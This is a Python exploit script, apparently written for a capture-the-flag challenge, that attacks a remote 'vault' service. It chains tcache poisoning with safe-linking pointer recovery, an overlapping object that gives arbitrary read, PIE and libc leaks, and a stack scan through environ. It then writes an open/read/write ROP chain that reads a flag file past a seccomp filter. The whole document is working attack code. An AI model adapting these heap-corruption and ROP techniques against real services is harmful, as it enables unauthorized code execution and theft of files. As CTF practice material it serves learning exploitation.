#!/usr/bin/env python3
import socket, struct, time, sys, os, re

HOST='chall.ctf.tccpens.id'; PORT=30846
S=0x100
D=0x150
PROMPT=b'vault> '

class Conn:
    def __init__(self, sock): self.s=sock; self.buf=b''
    def get(self,n):
        while len(self.buf)<n:
            b=self.s.recv(max(4096,n-len(self.buf)))
            if not b: raise EOFError(f'EOF need {n}, have {len(self.buf)}')
            self.buf+=b
        out,self.buf=self.buf[:n],self.buf[n:]
        return out
    def until(self, marker):
        while marker not in self.buf:
            b=self.s.recv(4096)
            if not b: raise EOFError(f'EOF before {marker!r}: {self.buf!r}')
            self.buf+=b
        i=self.buf.index(marker)+len(marker)
        out,self.buf=self.buf[:i],self.buf[i:]
        return out
    def command(self,line,raw=b''):
        self.s.sendall(line+b'\n'+raw)
        return self.until(PROMPT)
    def view(self,slot):
        self.s.sendall(f'VIEW {slot}\n'.encode())
        prefix=self.until(b'[*] content(')
        # size digits then the exact marker
        hdr=self.until(b'): ')
        size=int(hdr[:-3])
        data=self.get(size)
        tail=self.until(PROMPT)
        return prefix+b'[*] content('+hdr+data+tail, data

def newconn():
    s=socket.create_connection((HOST,PORT),timeout=8); s.settimeout(8)
    c=Conn(s); banner=c.until(PROMPT)
    return c

def create(c, slot, name=b'N', size=S, data=b''):
    assert len(name)<=23 and len(data)<=size
    out=c.command(f'CREATE {slot} {len(name)} {size} {len(data)}'.encode(), name+data)
    print('create',slot,repr(out))
    return out

def archive(c,slot):
    o=c.command(f'ARCHIVE {slot}'.encode()); print('archive',slot,repr(o)); return o

def restore(c,cold,slot):
    o=c.command(f'RESTORE {cold} {slot}'.encode()); print('restore',cold,slot,repr(o)); return o

def leakptrs(c,ida,idb):
    oa,da=c.view(ida); ob,db=c.view(idb)
    a_enc=struct.unpack('<Q',da[:8])[0]
    b_enc=struct.unpack('<Q',db[:8])[0]
    print('A data',da[:24].hex(),'B data',db[:24].hex(),'encoded',hex(a_enc),hex(b_enc))
    page=a_enc<<12
    cand=[]
    for low in range(0,0x1000,16):
        p=page+low
        q=p+D
        if (p ^ (q>>12)) == b_enc:
            cand.append(p)
    print('candidates',list(map(hex,cand)))
    if len(cand)!=1: raise Exception('could not recover heap ptr')
    return cand[0]

def main():
    c=newconn(); print('banner ok')
    create(c,0,b'A',S,b'a')
    create(c,1,b'B',S,b'b')
    archive(c,0); archive(c,1)
    restore(c,0,0); restore(c,1,1)
    p=leakptrs(c,0,1)
    print('heap A blob',hex(p),'objA',hex(p-0x40))
    target=p-0x40+16
    # poison B's tcache next to objA+16
    enc=target ^ ((p+D)>>12)
    print('target objA+16',hex(target),'B ptr',hex(p+D),'encoded poison',hex(enc))
    print('edit poison',repr(c.command(b'EDIT 1 8',struct.pack('<Q',enc))))
    create(c,2,b'C',S,b'')
    # Place PROTECT_PTR(target, NULL) in the fake entry before tcache_get reads it,
    # so the bin is truly empty after the poisoned allocation.
    create(c,3,b'D',S,struct.pack('<Q',target>>12))
    print('edit target blob_size',repr(c.command(b'EDIT 3 8',struct.pack('<Q',0x408))))
    o,data=c.view(0)
    print('overflow leak len',len(data),'head',data[:0x180].hex())
    open('/home/user/stage1.out','wb').write(data)
    # locate callback of B struct at offset D-S? p+0x110 means +0x110 from p
    cb=struct.unpack_from('<Q',data,0x110)[0]
    print('callback leak',hex(cb),'piebase',hex(cb-0x1e20))
    pie=cb-0x1e20
    objA=p-0x40
    # The poisoned tcache entry had a stale next pointer because malloc read the
    # object's old blob_size as its encoded FD. Compute it, then normalize a fresh
    # two-entry chain by changing the second chunk's FD to PROTECT_PTR(chunk,NULL).
    stale_head=0x100 ^ (target>>12)
    create(c,4,b'E',S,b'e')
    create(c,5,b'F',S,b'f')
    archive(c,4); archive(c,5)
    restore(c,2,4); restore(c,3,5)
    _,ddata=c.view(4); _,edata=c.view(5)
    denc=struct.unpack('<Q',ddata[:8])[0]
    eenc=struct.unpack('<Q',edata[:8])[0]
    dpage=denc ^ stale_head
    print('cleanup chain denc/eenc',hex(denc),hex(eenc),'stale',hex(stale_head),'dpage',hex(dpage))
    print('clear tcache next',repr(c.command(b'EDIT 4 8',struct.pack('<Q',dpage))))
    create(c,6,b'G',S,b'')
    create(c,7,b'H',S,b'') # pops D, leaving tcache bin NULL
    # Now make a clean chain and poison it to object A itself.
    create(c,8,b'I',S,b'i')
    create(c,9,b'J',S,b'j')
    archive(c,8); archive(c,9)
    restore(c,4,8); restore(c,5,9)
    hptr=leakptrs(c,8,9)
    jptr=hptr+D
    print('H/J blobs',hex(hptr),hex(jptr),'target objA',hex(objA))
    enc=objA ^ (jptr>>12)
    print('poison for objA',hex(enc))
    print('edit poison2',repr(c.command(b'EDIT 9 8',struct.pack('<Q',enc))))
    create(c,10,b'K',S,b'')
    create(c,11,b'L',S,b'')
    # The second allocation now overlaps object A. Turn it into a read primitive
    # by restoring the original VIEW callback and pointing it at read@GOT.
    read_got=pie+0x3f88
    obj=struct.pack('<QQQQ',pie+0x1e20,read_got,8,0)+b'Z'*24
    print('edit object A',repr(c.command(b'EDIT 11 56',obj)))
    out,libcbytes=c.view(0)
    readptr=struct.unpack('<Q',libcbytes[:8])[0]
    print('read@libc',hex(readptr),'bytes',libcbytes.hex())
    libc=readptr-0x11bd20
    print('libc base',hex(libc))
    def write_obj(cbptr, datptr, size, namelen=0):
        payload=struct.pack('<QQQQ',cbptr,datptr,size,namelen)+b'Q'*24
        o=c.command(b'EDIT 11 56',payload)
        if b'[+] edited' not in o: raise RuntimeError(('write_obj failed',o))
    def arbitrary_read(addr,n):
        write_obj(pie+0x1e20,addr,n,0)
        _,raw=c.view(0)
        if len(raw)!=n: raise RuntimeError(('bad read',hex(addr),n,len(raw)))
        return raw
    envp=struct.unpack('<Q',arbitrary_read(libc+0x20bd58,8))[0]
    print('environ ptr',hex(envp))
    target_ret=libc+0x2a1ca
    print('search saved main return',hex(target_ret))
    found=[]
    scan_start=(envp-0x1000)&~7
    scan_end=envp+0x200
    step=0x400
    for base in range(scan_start,scan_end,step):
        n=min(step,scan_end-base)
        print('scan',hex(base),hex(n))
        raw=arbitrary_read(base,n)
        for off in range(0,n-7,8):
            if struct.unpack_from('<Q',raw,off)[0]==target_ret:
                found.append(base+off)
    print('saved return locations',list(map(hex,found)))
    if not found: raise RuntimeError('saved return address not found')
    ret_slot=found[0]
    canary=struct.unpack('<Q',arbitrary_read(ret_slot-0x40,8))[0]
    print('ret slot',hex(ret_slot),'canary',hex(canary))
    # Build an ORW chain on main's stack. The target seccomp policy permits
    # open/read/write/exit. Use the exact bundled libc offsets.
    pop_rdi=libc+0x10c08d
    pop_rsi=libc+0x110b7d
    pop_rdx=libc+0xb513c       # pop rdx; xor eax,eax; pop rbx,r12,r13,rbp; ret
    retg=libc+0x2a144
    open_fn=libc+0x11b3f0
    read_fn=libc+0x11bd20
    write_fn=libc+0x11c830
    exit_fn=libc+0x47ba0
    path_addr=ret_slot+0x200
    buf_addr=ret_slot+0x300
    words=[]
    def poprdx(v): words.extend([pop_rdx,v,0,0,0,0])
    def poparg(g,v): words.extend([g,v])
    def call(fn):
        # At function entry the ABI requires rsp % 16 == 8.
        idx=len(words)
        if (ret_slot + 8*(idx+1)) % 16 != 8:
            words.append(retg)
        words.append(fn)
    poprdx(0)             # open(path, O_RDONLY, mode=0)
    poparg(pop_rdi,path_addr)
    poparg(pop_rsi,0)
    call(open_fn)
    poprdx(0x100)
    poparg(pop_rdi,3)     # open() returns fd 3
    poparg(pop_rsi,buf_addr)
    call(read_fn)
    poprdx(0x100)
    poparg(pop_rdi,1)
    poparg(pop_rsi,buf_addr)
    call(write_fn)
    poparg(pop_rdi,0)
    call(exit_fn)
    chain=struct.pack('<'+'Q'*len(words),*words)
    base=ret_slot-0x30
    payload=struct.pack('<6Q',0,0,0,0,0,0)+chain
    path_offset=path_addr-base
    if len(payload)>path_offset: raise RuntimeError('ROP chain overlaps path')
    dir_path=os.environ.get('DIR','/home/ctf/flag.txt')
    path_bytes=dir_path.encode()+b'\0'
    payload+=b'\0'*(path_offset-len(payload))+path_bytes
    if len(payload)>0x408: raise RuntimeError('ROP payload too large')
    print('ROP words',len(words),'payload',len(payload),'path',hex(path_addr),'buf',hex(buf_addr))
    write_obj(pie+0x1da0,base,len(payload),0) # callback = read_exact(dest,len)
    c.s.sendall(b'VIEW 0\n')
    c.until(b'[*] content(')
    content_hdr=c.until(b'): ')
    print('trigger read_exact size',content_hdr)
    c.s.sendall(payload)
    print('view tail',repr(c.until(PROMPT)))
    c.s.sendall(b'QUIT\n')
    c.s.settimeout(3)
    output=b''
    try:
        while True:
            x=c.s.recv(4096)
            if not x: break
            output+=x
    except Exception: pass
    match=re.search(rb'IONIC\{[^}\r\n]+\}',output)
    if match:
        print('FLAG:',match.group().decode())
    else:
        print('No flag matched. Raw output:',repr(output[:500]))
    c.s.close()

if __name__=='__main__': main()
